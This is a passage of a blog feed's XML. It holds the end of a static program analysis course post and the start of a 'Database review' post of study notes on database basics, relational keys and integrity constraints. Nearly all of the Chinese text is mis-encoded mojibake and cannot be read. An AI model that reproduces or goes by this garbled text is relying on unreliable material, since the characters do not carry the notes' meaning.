Lattice"></a>3. Lattice</h2><h2 id="4-Data-Flow-Analysis-Framework-via-Lattice"><a href="#4-Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="4. Data Flow Analysis Framework via Lattice"></a>4. Data Flow Analysis Framework via Lattice</h2><p><img src="/2021/05/03/static-program/image-20210317205624533.png" alt="image-20210317205624533"></p><h2 id="5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem"><a href="#5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="5. Relate Iterative Algorithm to Fixed-Point Theorem"></a>5. Relate Iterative Algorithm to Fixed-Point Theorem</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-Static-Program-Analysis&quot;&gt;&lt;a href=&quot;#0x01-Static-Program-Analysis&quot; class=&quot;headerlink&quot; title=&quot;0x01 Static Program Analysis&quot;&gt;&lt;/a&gt;0x01 Static Program Analysis&lt;/h1&gt;</summary>
    
    
    
    
    <category term="Course" scheme="https://pz1o.top/tags/Course/"/>
    
  </entry>
  
  <entry>
    <title>Database review</title>
    <link href="https://pz1o.top/2021/05/03/Database-review/"/>
    <id>https://pz1o.top/2021/05/03/Database-review/</id>
    <published>2021-05-03T08:12:11.000Z</published>
    <updated>2021-06-09T11:46:54.223Z</updated>
    
    <content type="html"><![CDATA[<p>Â§ç‰π†</p><a id="more"></a><p>ÂêÑÁ´†ËäÇÈúÄË¶ÅÊéåÊè°ÁöÑÂÜÖÂÆπ</p><p><img src="/2021/05/03/Database-review/image-20210503155841659.png" alt></p><p><img src="/2021/05/03/Database-review/image-20210503160432223.png" alt="image-20210503160432223"></p><p><img src="/2021/05/03/Database-review/image-20210503160508449.png" alt="image-20210503160508449"></p><h1 id="0x01-Á¨¨‰∏ÄÁ´†-Áª™ËÆ∫"><a href="#0x01-Á¨¨‰∏ÄÁ´†-Áª™ËÆ∫" class="headerlink" title="0x01 Á¨¨‰∏ÄÁ´† Áª™ËÆ∫"></a>0x01 Á¨¨‰∏ÄÁ´† Áª™ËÆ∫</h1><h2 id="1-1-Êï∞ÊçÆÂ∫ìÂü∫Êú¨Ê¶ÇÂøµ"><a href="#1-1-Êï∞ÊçÆÂ∫ìÂü∫Êú¨Ê¶ÇÂøµ" class="headerlink" title="1.1 Êï∞ÊçÆÂ∫ìÂü∫Êú¨Ê¶ÇÂøµ"></a>1.1 Êï∞ÊçÆÂ∫ìÂü∫Êú¨Ê¶ÇÂøµ</h2><p>Êï∞ÊçÆÂ∫ìÔºàDBÔºâÔºöÊï∞ÊçÆÂ∫ìÊòØÊåáÂú®ËÆ°ÁÆóÊú∫ÁöÑÂ≠òÂÇ®ËÆæÂ§á‰∏äÂêàÁêÜÂ≠òÊîæ„ÄÅÁõ∏ÂÖ≥ËÅî„ÄÅÊúâÁªìÊûÑÁöÑÊï∞ÊçÆÈõÜÂêà„ÄÇ</p><p>Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ≥ªÁªüÔºàDBMSÔºâÔºö‰Ωç‰∫éÁî®Êà∑ÂíåÊìç‰ΩúÁ≥ªÁªü‰πãÈó¥ÁöÑ‰∏ÄÂ±ÇÊï∞ÊçÆÁÆ°ÁêÜËΩØ‰ª∂„ÄÇ</p><p>Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÔºàDBSÔºâÔºöÂºïËøõÊï∞ÊçÆÂ∫ìÂíåÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ≥ªÁªüÂêéÁöÑÁªÑÊàê„ÄÇ</p><p>Êï∞ÊçÆÂ∫ìÂ∫îÁî®Á≥ªÁªüÔºàDBASÔºâÔºöÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÂèäÂÖ∂Â∫îÁî®Á®ãÂ∫èÁöÑÁªÑÊàê„ÄÇ</p><p><img src="/2021/05/03/Database-review/image-20210503165104565.png" alt="image-20210503165104565"></p><h2 id="1-2-Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁâπÁÇπ"><a href="#1-2-Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁâπÁÇπ" class="headerlink" title="1.2 Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁâπÁÇπ"></a>1.2 Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁâπÁÇπ</h2><h3 id="Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÊäÄÊúØÂèëÂ±ïÂÖ±Êúâ‰∏â‰∏™Èò∂ÊÆµ"><a href="#Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÊäÄÊúØÂèëÂ±ïÂÖ±Êúâ‰∏â‰∏™Èò∂ÊÆµ" class="headerlink" title="Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÊäÄÊúØÂèëÂ±ïÂÖ±Êúâ‰∏â‰∏™Èò∂ÊÆµ"></a>Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÊäÄÊúØÂèëÂ±ïÂÖ±Êúâ‰∏â‰∏™Èò∂ÊÆµ</h3><p><strong>1.‰∫∫Â∑•ÁÆ°ÁêÜÈò∂ÊÆµ</strong></p><p>ÁâπÁÇπ</p><p>(1)ËÆ°ÁÆóÊú∫Á≥ªÁªü‰∏çÊèê‰æõÂØπÁî®Êà∑Êï∞ÊçÆÁöÑÁÆ°ÁêÜÂäüËÉΩÔºõ</p><p>(2)Êï∞ÊçÆ‰∏çËÉΩÂÖ±‰∫´Ôºõ</p><p>(3)‰∏ç‰øùÂ≠òÊï∞ÊçÆ„ÄÇ</p><p><strong>2.Êñá‰ª∂Á≥ªÁªüÈò∂ÊÆµ</strong></p><p>ÁâπÁÇπ:</p><p>Êï∞ÊçÆ‰ª•‚ÄúÊñá‰ª∂‚ÄùÂΩ¢ÂºèÂèØÈïøÊúü‰øùÂ≠òÂú®Â§ñÈÉ®Â≠òÂÇ®Âô®ÁöÑÁ£ÅÁõò‰∏ä„ÄÇÁî±‰∫éËÆ°ÁÆóÊú∫ÁöÑÂ∫îÁî®ËΩ¨Âêë‰ø°ÊÅØÁÆ°ÁêÜÔºåÂõ†Ê≠§ÂØπÊñá‰ª∂Ë¶ÅËøõË°åÂ§ßÈáèÁöÑÊü•ËØ¢„ÄÅ‰øÆÊîπÂíåÊèíÂÖ•Á≠âÊìç‰ΩúÔºåËøô‰∫õÊìç‰ΩúÁî±Êñá‰ª∂Á≥ªÁªüÊèê‰æõ„ÄÇ  </p><p>Áº∫ÁÇπ:</p><p>Êï∞ÊçÆÂÜó‰Ωô;‰∏ç‰∏ÄËá¥ÊÄß;Êï∞ÊçÆÁã¨Á´ãÊÄßÂ∑Æ;Êï∞ÊçÆÊó†ÁªìÊûÑ„ÄÇ</p><p><strong>3.Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÈò∂ÊÆµ</strong></p><p>ÁâπÁÇπ:</p><p>Ôºà1ÔºâÊï∞ÊçÆÁªìÊûÑÂåñ„ÄÇ</p><p>Ôºà2ÔºâÊï∞ÊçÆÂÖ±‰∫´ÊÄßÈ´ò„ÄÅÂÜó‰ΩôÂ∞ë‰∏îÊòìÊâ©ÂÖÖ„ÄÇ</p><p>Ôºà3ÔºâÊï∞ÊçÆÁã¨Á´ãÊÄßÈ´ò„ÄÇ</p><p>Ôºà4ÔºâÊï∞ÊçÆÁî±DBMSÁªü‰∏ÄÁÆ°ÁêÜÂíåÊéßÂà∂„ÄÇ</p><h2 id="1-3-Êï∞ÊçÆÊ®°Âûã"><a href="#1-3-Êï∞ÊçÆÊ®°Âûã" class="headerlink" title="1.3 Êï∞ÊçÆÊ®°Âûã"></a>1.3 Êï∞ÊçÆÊ®°Âûã</h2><h3 id="Êï∞ÊçÆÊ®°ÂûãÊ¶ÇÂøµ"><a href="#Êï∞ÊçÆÊ®°ÂûãÊ¶ÇÂøµ" class="headerlink" title="Êï∞ÊçÆÊ®°ÂûãÊ¶ÇÂøµ"></a>Êï∞ÊçÆÊ®°ÂûãÊ¶ÇÂøµ</h3><p>Áé∞ÂÆû‰∏ñÁïåÊï∞ÊçÆÁâπÂæÅÁöÑÊ®°ÊãüÂíåÊäΩË±°„ÄÇ</p><h3 id="Êï∞ÊçÆÊ®°ÂûãÁöÑÂàÜÁ±ª"><a href="#Êï∞ÊçÆÊ®°ÂûãÁöÑÂàÜÁ±ª" class="headerlink" title="Êï∞ÊçÆÊ®°ÂûãÁöÑÂàÜÁ±ª"></a>Êï∞ÊçÆÊ®°ÂûãÁöÑÂàÜÁ±ª</h3><ol><li><p>Ê¶ÇÂøµÊï∞ÊçÆÊ®°ÂûãÔºöÊåâÁî®Êà∑ÁöÑËßÇÁÇπÊù•ÂØπÊï∞ÊçÆÂíå‰ø°ÊÅØÂª∫Ê®°Ôºå‰∏ªË¶ÅÁî®‰∫éÊï∞ÊçÆÂ∫ìËÆæËÆ°</p><p>Ê¶ÇÂøµÊ®°ÂûãÁöÑË°®Á§∫ÊñπÊ≥ïÂæàÂ§öÔºåÊúÄÂ∏∏Áî®ÁöÑ‰∏∫ÂÆû‰Ωì-ËÅîÁ≥ªÊñπÊ≥ï(Entity-Relationship approachÔºâÔºåËØ•ÊñπÊ≥ïÁî®E-RÂõæÊù•ÊèèËø∞Ê¶ÇÂøµÊ®°Âûã„ÄÇE-RÊñπÊ≥ï‰πüÊàê‰∏∫E-RÊ®°Âûã</p></li><li><p>ÈÄªËæëÊï∞ÊçÆÊ®°ÂûãÔºöÂåÖÊã¨Â±ÇÊ¨°Ê®°Âûã„ÄÅÁΩëÁä∂Ê®°Âûã„ÄÅÂÖ≥Á≥ªÊ®°Âûã„ÄÅÈù¢ÂêëÂØπË±°Ê®°ÂûãÂíåÂØπË±°ÂÖ≥Á≥ªÊï∞ÊçÆÊ®°ÂûãÁ≠âÔºå‰∏ªË¶ÅÁî®‰∫éÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂÆûÁé∞„ÄÇ</p></li><li><p>Áâ©ÁêÜÊï∞ÊçÆÊ®°ÂûãÔºöÂØπÊï∞ÊçÆÊúÄÂ∫ïÂ±ÇÁöÑÊäΩË±°ÔºåÂÆÉÊèèËø∞Êï∞ÊçÆÂú®Á≥ªÁªüÂÜÖÈÉ®ÁöÑË°®Á§∫ÊñπÊ≥ïÂíåÂ≠òÂèñÊñπÊ≥ïÔºåÂú®Á£ÅÁõòÊàñÁ£ÅÂ∏¶‰∏äÁöÑÂ≠òÂÇ®ÊñπÂºèÂíåÂ≠òÂèñÊñπÊ≥ïÔºåÊòØÈù¢ÂêëËÆ°ÁÆóÊú∫Á≥ªÁªüÁöÑ„ÄÇ</p></li></ol><h3 id="Êï∞ÊçÆÊ®°ÂûãÁöÑÁªÑÊàêË¶ÅÁ¥†"><a href="#Êï∞ÊçÆÊ®°ÂûãÁöÑÁªÑÊàêË¶ÅÁ¥†" class="headerlink" title="Êï∞ÊçÆÊ®°ÂûãÁöÑÁªÑÊàêË¶ÅÁ¥†"></a>Êï∞ÊçÆÊ®°ÂûãÁöÑÁªÑÊàêË¶ÅÁ¥†</h3><p>Êï∞ÊçÆÊ®°ÂûãÈÄöÂ∏∏Áî±<strong>Êï∞ÊçÆÁªìÊûÑ„ÄÅÊï∞ÊçÆÊìç‰ΩúÂíåÂÆåÊï¥ÊÄßÁ∫¶Êùü</strong>‰∏â‰∏™ÈÉ®ÂàÜÁªÑÊàê„ÄÇ</p><p>Êï∞ÊçÆÁªìÊûÑÊèèËø∞Êï∞ÊçÆÂ∫ìÁöÑÁªÑÊàêÂØπË±°‰ª•ÂèäÂØπË±°‰πãÈó¥ÁöÑËÅîÁ≥ªÔºåÈÄöÂ∏∏ÊåâÂÖ∂Êï∞ÊçÆÁªìÊûÑÁöÑÁ±ªÂûãÊù•ÂëΩÂêçÊï∞ÊçÆÊ®°ÂûãÔºå‰æãÂ¶ÇÂ±ÇÊ¨°ÁªìÊûÑ„ÄÅÁΩëÁä∂ÁªìÊûÑÂíåÂÖ≥Á≥ªÁªìÊûÑÁöÑÊï∞ÊçÆÊ®°ÂûãÂàÜÂà´ÂëΩÂêç‰∏∫Â±ÇÊ¨°Ê®°Âûã„ÄÅÁΩëÁä∂Ê®°Âûã„ÄÅÂÖ≥Á≥ªÊ®°Âûã„ÄÇ</p><p>Êï∞ÊçÆÊìç‰ΩúÊòØÊåáÂØπÊï∞ÊçÆÂ∫ì‰∏≠ÂêÑÁßçÂØπË±°ÁöÑÂÆû‰æãÂÖÅËÆ∏ÊâßË°åÁöÑÊìç‰ΩúÁöÑÈõÜÂêàÔºåÂåÖÊã¨Êìç‰ΩúÂèäÂÖ∂ÊúâÂÖ≥ÁöÑËßÑÂàôÔºå‰∏ªË¶ÅÂàÜ‰∏∫Êü•ËØ¢ÂíåÊõ¥Êñ∞ÔºàÊèíÂÖ•„ÄÅÂà†Èô§„ÄÅ‰øÆÊîπÔºâ‰∏§Â§ßÁ±ªÊìç‰Ωú„ÄÇ</p><p>ÂÆåÊï¥ÊÄßÁ∫¶ÊùüÊù°‰ª∂ÊòØÁªôÂÆöÁöÑÊï∞ÊçÆÊ®°Âûã‰∏≠Êï∞ÊçÆÂèäÂÖ∂ËÅîÁ≥ªÊâÄÂÖ∑ÊúâÁöÑÂà∂Á∫¶Âíå‰æùÂ≠òËßÑÂàôÔºåÂú®ÂÖ≥Á≥ªÊ®°Âûã‰∏≠‰ΩìÁé∞‰∏∫ÂÆû‰ΩìÂÆåÊï¥ÊÄßÂíåÂèÇÁÖßÂÆåÊï¥ÊÄß„ÄÇ‰æãÂ¶ÇÔºåÊüêÂ§ßÂ≠¶ÁöÑÊï∞ÊçÆÂ∫ì‰∏≠ËßÑÂÆöÂ≠¶ÁîüÊàêÁª©Â¶ÇÊûúÊúâ6Èó®‰ª•‰∏ä‰∏çÂèäÊ†ºÂàô‰∏çËÉΩÊéà‰∫àÂ≠¶Â£´Â≠¶‰ΩçÔºåÊïôÊéàÁöÑÈÄÄ‰ºëÂπ¥ÈæÑÊòØ65Âë®Â≤ÅÁ≠â„ÄÇ</p><h2 id="1-4-ÂÆû‰ΩìËÅîÁ≥ªÊï∞ÊçÆÊ®°Âûã"><a href="#1-4-ÂÆû‰ΩìËÅîÁ≥ªÊï∞ÊçÆÊ®°Âûã" class="headerlink" title="1.4 ÂÆû‰ΩìËÅîÁ≥ªÊï∞ÊçÆÊ®°Âûã"></a>1.4 ÂÆû‰ΩìËÅîÁ≥ªÊï∞ÊçÆÊ®°Âûã</h2><h3 id="ÂÆû‰Ωì"><a href="#ÂÆû‰Ωì" class="headerlink" title="ÂÆû‰Ωì"></a>ÂÆû‰Ωì</h3><p>ÂÆû‰ΩìÔºöÂÆ¢ËßÇÂ≠òÂú®Âπ∂ÂèØÁõ∏‰∫íÂå∫Âà´ÁöÑ‰∏™‰Ωì„ÄÇÂ¶ÇÔºöÂ≠¶Áîü„ÄÇ</p><p>ÂÆû‰ΩìÁâπÊÄßÔºöÊèèËø∞ÂÆû‰ΩìÁöÑ‰∏ªË¶ÅÁâπÂæÅ„ÄÇÂ¶ÇÔºöÂ≠¶ÁîüÁöÑÂπ¥ÈæÑÔºåÂ≠¶Âè∑ÔºåÊÄßÂà´Á≠â„ÄÇ</p><p>ÂÆû‰ΩìÈõÜÔºöÂÖ∑ÊúâÁõ∏ÂêåÁâπÊÄßÂÆû‰ΩìÁöÑÈõÜÂêà„ÄÇÂ¶ÇÔºö‰∏Ä‰∏™Â≠¶Ê†°ÁöÑÂ≠¶Áîü„ÄÇ</p><p>ÂÆû‰ΩìÊ†áËØÜÁ¨¶ÔºöÂú®ÂÆû‰ΩìÈõÜ‰∏≠ÂîØ‰∏ÄËÉΩÁ°ÆÂÆöÂÆû‰ΩìÈõÜÁöÑ‰∏≠ÁöÑÊüê‰∏™ÂÆû‰ΩìÊúÄÂ∞èÂÆû‰ΩìÁâπÊÄßÈõÜ„ÄÇÂ¶ÇÔºöÂ≠¶Âè∑ÂèØ‰ª•ÂîØ‰∏ÄÁ°ÆÂÆöÂ≠¶Áîü„ÄÇ<strong>ÂèØ‰ª•Áî±Â§ö‰∏™ÂÆû‰ΩìÁâπÊÄßÁªÑÊàê„ÄÇ</strong></p><h3 id="Â±ûÊÄß"><a href="#Â±ûÊÄß" class="headerlink" title="Â±ûÊÄß"></a>Â±ûÊÄß</h3><ol><li>‰∏Ä‰∏™ÂÆû‰ΩìËÆ∞ÂΩïÂèØ‰ª•ÊúâËã•Âπ≤‰∏™Â±ûÊÄß</li><li>‰∏çÂèØÂÜçÂàÜÁöÑÂ±ûÊÄßÂè´ÂéüÂ≠êÂ±ûÊÄßÔºåÂèØÂÜçÂàÜÁöÑÂ±ûÊÄßÂè´ÂèØÂàÜÂ±ûÊÄß</li><li>Â±ûÊÄßÊúâÂûã‰∏éÂÄº‰πãÂàÜ</li><li>ÂÄºÂüüÔºàÂ±ûÊÄßÂÄºÁöÑËåÉÂõ¥Ôºâ</li><li>ÂÖ≥ÈîÆÂ≠ó</li></ol><h3 id="ÂÆû‰ΩìÈõÜ‰πãÈó¥ÁöÑËÅîÁ≥ª"><a href="#ÂÆû‰ΩìÈõÜ‰πãÈó¥ÁöÑËÅîÁ≥ª" class="headerlink" title="ÂÆû‰ΩìÈõÜ‰πãÈó¥ÁöÑËÅîÁ≥ª"></a>ÂÆû‰ΩìÈõÜ‰πãÈó¥ÁöÑËÅîÁ≥ª</h3><ol><li>ÂÆû‰ΩìÂÜÖÈÉ®ËÅîÁ≥ª</li><li>ÂÆû‰ΩìÈõÜËÅîÁ≥ª</li></ol><p>ÂÆû‰ΩìÈõÜÈó¥ÁöÑËÅîÁ≥ªÔºö</p><ol><li>‰∫åÂÖÉËÅîÁ≥ªÔºöÂè™Êúâ‰∏§‰∏™ÂÆû‰ΩìÈõÜÂèÇ‰∏éÁöÑËÅîÁ≥ª</li><li>Â§öÂÖÉËÅîÁ≥ªÔºöÂèÇ‰∏éÂÆû‰ΩìÈõÜÂ§ß‰∫éÁ≠â‰∫é3ÁöÑËÅîÁ≥ª</li><li>Ëá™ÂèçËÅîÁ≥ªÔºöÂêå‰∏ÄÂÆû‰ΩìÈõÜÂÜÖÂÆû‰ΩìÂÜÖÈÉ®ÁöÑËÅîÁ≥ª</li></ol><h3 id="E-RÂõæ"><a href="#E-RÂõæ" class="headerlink" title="E-RÂõæ"></a>E-RÂõæ</h3><p>ÁúãÁÆ≠Â§¥</p><p><img src="/2021/05/03/Database-review/image-20210504211912646.png" alt="image-20210504211912646"></p><h2 id="1-5-Êï∞ÊçÆÂ∫ìÁ≥ªÁªü‰ΩìÁ≥ªÁªìÊûÑ"><a href="#1-5-Êï∞ÊçÆÂ∫ìÁ≥ªÁªü‰ΩìÁ≥ªÁªìÊûÑ" class="headerlink" title="1.5 Êï∞ÊçÆÂ∫ìÁ≥ªÁªü‰ΩìÁ≥ªÁªìÊûÑ"></a>1.5 Êï∞ÊçÆÂ∫ìÁ≥ªÁªü‰ΩìÁ≥ªÁªìÊûÑ</h2><h3 id="Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁöÑ‰∏âÁ∫ßÊ®°ÂºèÁªìÊûÑ"><a href="#Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁöÑ‰∏âÁ∫ßÊ®°ÂºèÁªìÊûÑ" class="headerlink" title="Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁöÑ‰∏âÁ∫ßÊ®°ÂºèÁªìÊûÑ"></a>Êï∞ÊçÆÂ∫ìÁ≥ªÁªüÁöÑ‰∏âÁ∫ßÊ®°ÂºèÁªìÊûÑ</h3><p>Â§ñÊ®°ÂºèÔºö<strong>‰πüÁß∞Â≠êÊ®°ÂºèÊàñÁî®Êà∑Ê®°Âºè</strong>ÔºåÊï∞ÊçÆÂ∫ìÁî®Êà∑ÔºàÂåÖÊã¨Â∫îÁî®Á®ãÂ∫èÂëòÂíåÊúÄÁªàÁî®Êà∑Ôºâ‰ΩøÁî®ÁöÑÂ±ÄÈÉ®Êï∞ÊçÆÁöÑÈÄªËæëÁªìÊûÑÂíåÁâπÂæÅÁöÑÊèèËø∞„ÄÇ</p><p>Ê®°ÂºèÔºöÁß∞‰∏∫<strong>Ê¶ÇÂøµÊ®°ÂºèÊàñËÄÖÈÄªËæëÊ®°Âºè</strong>ÔºåÊòØÂØπÊï∞ÊçÆÂ∫ìÂÖ®‰ΩìÈÄªËæëÁªìÊûÑÁöÑÊèèËø∞,ÊòØÊï∞ÊçÆÂ∫ìÊâÄÊúâÁî®Êà∑ÁöÑÂÖ¨ÂÖ±Êï∞ÊçÆËßÜÂõæÔºåÊòØÁî±Êï∞ÊçÆÂ∫ìËÆæËÆ°ËÄÖÁªºÂêàÊâÄÊúâÁî®Êà∑Êï∞ÊçÆÔºåÊåâÁÖßÁªü‰∏ÄÁöÑËßÇÁÇπÊûÑÈÄ†ÁöÑÂØπÊï∞ÊçÆÂ∫ìÂÖ®Â±ÄÈÄªËæëÁªìÊûÑÁöÑÊèèËø∞„ÄÇ</p><p>ÂÜÖÊ®°ÂºèÔºö<strong>‰πüÁß∞Â≠òÂÇ®Ê®°Âºè</strong>ÔºåÊòØÊï∞ÊçÆÁâ©ÁêÜÁªìÊûÑÂíåÂ≠òÂÇ®ÊñπÂºèÁöÑÊèèËø∞ÔºåÊï∞ÊçÆÂú®Êï∞ÊçÆÂ∫ìÁöÑÂÜÖÈÉ®Ë°®Á§∫ÊñπÂºè„ÄÇ</p><p><img src="/2021/05/03/Database-review/image-20210504212756830.png" alt="image-20210504212756830"></p><h1 id="0x02-Á¨¨‰∫åÁ´†-ÂÖ≥Á≥ªÊ®°Âûã"><a href="#0x02-Á¨¨‰∫åÁ´†-ÂÖ≥Á≥ªÊ®°Âûã" class="headerlink" title="0x02 Á¨¨‰∫åÁ´† ÂÖ≥Á≥ªÊ®°Âûã"></a>0x02 Á¨¨‰∫åÁ´† ÂÖ≥Á≥ªÊ®°Âûã</h1><h2 id="2-1-Âü∫Êú¨Ê¶ÇÂøµ"><a href="#2-1-Âü∫Êú¨Ê¶ÇÂøµ" class="headerlink" title="2.1 Âü∫Êú¨Ê¶ÇÂøµ"></a>2.1 Âü∫Êú¨Ê¶ÇÂøµ</h2><p><strong>1.ÂüüÔºàDomainÔºâ</strong>ÔºöÂüüÊòØ‰∏ÄÁªÑÂÖ∑ÊúâÁõ∏ÂêåÊï∞ÊçÆÁ±ªÂûãÁöÑÂÄºÁöÑÈõÜÂêàÔºå‰æãÂ¶ÇÊï¥Êï∞„ÄÅËá™ÁÑ∂Êï∞ÈÉΩÊòØÂüü</p><p><strong>2.Á¨õÂç°Â∞îÁßØÔºàCartesian ProductÔºâ</strong>ÔºöÁ¨õÂç°Â∞îÁßØÊòØÂüü‰∏äÈù¢ÁöÑ‰∏ÄÁßçÈõÜÂêàËøêÁÆó„ÄÇ</p><p>ÁªôÂÆö‰∏ÄÁªÑÂüüD1ÔºåD2Ôºå‚Ä¶ÔºåDnÔºåÂÖÅËÆ∏ÂÖ∂‰∏≠Êüê‰∫õÂüüÊòØÁõ∏ÂêåÁöÑ„ÄÇ D1ÔºåD2Ôºå‚Ä¶ÔºåDnÁöÑÁ¨õÂç°Â∞îÁßØ‰∏∫Ôºö</p><p><img src="/2021/05/03/Database-review/20190629192647367.png" alt="img"></p><p>Á¨õÂç°Â∞îÁßØ‰∏≠ÊØè‰∏™ÂÖÉÁ¥†(d1,d2,‚Ä¶dn)Áß∞‰∏∫‰∏Ä‰∏™nÂÖÉÁªÑÊàñÁÆÄÁß∞<strong>ÂÖÉÁªÑ</strong></p><p>Á¨õÂç°Â∞îÁßØÂèØË°®Á§∫‰∏∫‰∏Ä‰∏™‰∫åÁª¥Ë°®Ôºå<strong>Ë°®‰∏≠ÊØèË°åÂØπÂ∫î‰∏Ä‰∏™ÂÖÉÁªÑÔºåË°®‰∏≠ÊØè‰∏ÄÂàóÁöÑÂÄºÊù•Ëá™‰∏Ä‰∏™Âüü</strong></p><p><strong>3.ÂÖ≥Á≥ªÔºàRelationÔºâ</strong></p><p>D1√óD2√ó‚Ä¶√óDnÁöÑÂ≠êÈõÜÂè´‰ΩúÂú®ÂüüD1ÔºåD2Ôºå‚Ä¶ÔºåDn‰∏äÁöÑÂÖ≥Á≥ªÔºå</p><p>Ë°®Á§∫‰∏∫RÔºàD1ÔºåD2Ôºå‚Ä¶ÔºåDnÔºâ</p><p>RÔºöÂÖ≥Á≥ªÂêç</p><p>nÔºöÂÖ≥Á≥ªÁöÑÁõÆÊàñÂ∫¶ÔºàDegreeÔºâ</p><p>ÂÖ≥Á≥ª‰πüÊòØ‰∏Ä‰∏™‰∫åÁª¥Ë°®ÔºåÊØèË°åÂØπÂ∫î‰∏Ä‰∏™ÂÖÉÁªÑÔºåÊØèÂàóÂØπÂ∫î‰∏Ä‰∏™ÂüüÔºåÊØèÂàóÁß∞‰∏∫Â±ûÊÄß</p><p>Ëã•ÂÖ≥Á≥ª‰∏≠ÁöÑÊüê‰∏ÄÂ±ûÊÄßÁªÑÁöÑÂÄºËÉΩÂîØ‰∏ÄÂú∞Ê†áËØÜ‰∏Ä‰∏™ÂÖÉÁªÑÔºåÂàôÁß∞ËØ•Â±ûÊÄßÁªÑ‰∏∫<strong>ÂÄôÈÄâÁ†ÅÔºàCandidate keyÔºâ</strong></p><p>Ëã•‰∏Ä‰∏™ÂÖ≥Á≥ªÊúâÂ§ö‰∏™ÂÄôÈÄâÁ†ÅÔºåÂàôÈÄâÂÆöÂÖ∂‰∏≠‰∏Ä‰∏™ÊàñÂ§ö‰∏™‰∏∫<strong>‰∏ªÁ†ÅÔºàPrimary keyÔºâ</strong></p><p>ÂÄôÈÄâÁ†ÅÁöÑÂ§ö‰∏™Â±ûÊÄßÁß∞‰∏∫<strong>‰∏ªÂ±ûÊÄß</strong>ÔºàPrime attributeÔºâÔºå‰∏çÂåÖÂê´Âú®‰ªª‰ΩïÂÄôÈÄâÁ†Å‰∏≠ÁöÑÂ±ûÊÄßÁß∞‰∏∫<strong>Èùû‰∏ªÂ±ûÊÄß</strong>ÔºõÊúÄÁÆÄÂçïÁöÑÊÉÖÂÜµ‰∏ãÔºåÂÄôÈÄâÁ†ÅÂè™ÂåÖÂê´‰∏Ä‰∏™Â±ûÊÄßÔºåÂ¶ÇÊûúÂÖ≥Á≥ªÊ®°ÂºèÁöÑÊâÄÊúâÂ±ûÊÄßÈÉΩÊòØËøô‰∏™ÂÖ≥Á≥ªÁöÑÂÄôÈÄâÁ†ÅÔºåÂàôÁß∞‰∏∫<strong>ÂÖ®Á†Å</strong>ÔºàAll-keyÔºâ</p><p><strong>Â§ñÁ†Å(Foreign Key)</strong>ÔºöËÆæFÊòØÂü∫Êú¨ÂÖ≥Á≥ªRÁöÑ‰∏Ä‰∏™Êàñ‰∏ÄÁªÑÂ±ûÊÄßÔºå‰ΩÜ‰∏çÊòØRÁöÑÁ†Å„ÄÇKsÊòØÂü∫Êú¨ÂÖ≥Á≥ªSÁöÑ‰∏ªÁ†Å„ÄÇÂ¶ÇÊûúF‰∏éKsÁõ∏ÂØπÂ∫îÔºåÂàôÁß∞FÊòØRÁöÑÂ§ñÁ†Å„ÄÇÂπ∂Áß∞Âü∫Êú¨ÂÖ≥Á≥ªR‰∏∫ÂèÇÁÖßÂÖ≥Á≥ª(Referencing Relation)ÔºåÂü∫Êú¨ÂÖ≥Á≥ªS‰∏∫Ë¢´ÂèÇÁÖßÂÖ≥Á≥ªÔºàReferenced Relationship)<strong>ËßÑÂàô:ÂØπ‰∫éR‰∏≠ÊØè‰∏™ÂÖÉÁªÑÂú®F‰∏äÁöÑÂÄºÂøÖÈ°ª‰∏∫:ÂèñÁ©∫ÂÄºÊàñÁ≠â‰∫éS‰∏≠Êüê‰∏™ÂÖÉÁªÑÁöÑ‰∏ªÁ†ÅÂÄº</strong></p><h2 id="2-2-ÂÖ≥Á≥ªÊìç‰ΩúÂíåÂÆåÊï¥ÊÄßÁ∫¶Êùü"><a href="#2-2-ÂÖ≥Á≥ªÊìç‰ΩúÂíåÂÆåÊï¥ÊÄßÁ∫¶Êùü" class="headerlink" title="2.2 ÂÖ≥Á≥ªÊìç‰ΩúÂíåÂÆåÊï¥ÊÄßÁ∫¶Êùü"></a>2.2 ÂÖ≥Á≥ªÊìç‰ΩúÂíåÂÆåÊï¥ÊÄßÁ∫¶Êùü</h2><p>ÂÖ≥Á≥ªÊìç‰Ωú‰∏§Á±ªÔºöÂÖ≥Á≥ªÊ£ÄÁ¥¢ÂíåÂÖ≥Á≥ªÊõ¥Êñ∞ÔºàÊèíÂÖ•ÔºåÂà†Èô§Ôºå‰øÆÊîπÔºâ</p><p>ÂÖ≥Á≥ªÊ®°ÂûãÁöÑÂÆåÊï¥ÊÄßËßÑÂàôÊòØÂØπÂÖ≥Á≥ªÁöÑÊüêÁßçÁ∫¶ÊùüÊù°‰ª∂ÔºåÂÖ≥Á≥ªÊ®°Âûã‰∏≠Êúâ‰∏âÁ±ªÂÆåÊï¥ÊÄßÁ∫¶ÊùüÔºö</p><p><strong>ÂÆû‰ΩìÂÆåÊï¥ÊÄßÔºàEntity IntegrityÔºâ</strong>ÔºöÂÖ≥Á≥ªÊ®°Âûã‰ª•‰∏ªÁ†Å‰Ωú‰∏∫ÂîØ‰∏ÄÊÄßÊ†áËØÜÔºå‰∏ªÁ†Å‰∏≠ÁöÑÂ±ûÊÄßÂç≥‰∏ªÂ±ûÊÄß‰∏çËÉΩÂèñÁ©∫ÂÄº</p><p><strong>ÂèÇÁÖßÂÆåÊï¥ÊÄßÔºàReferential IntegrityÔºâ</strong>ÔºöÂ§ñÁ†Å</p><p><strong>Áî®Êà∑Ëá™ÂÆö‰πâÂÆåÊï¥ÊÄßÔºàUser-defined 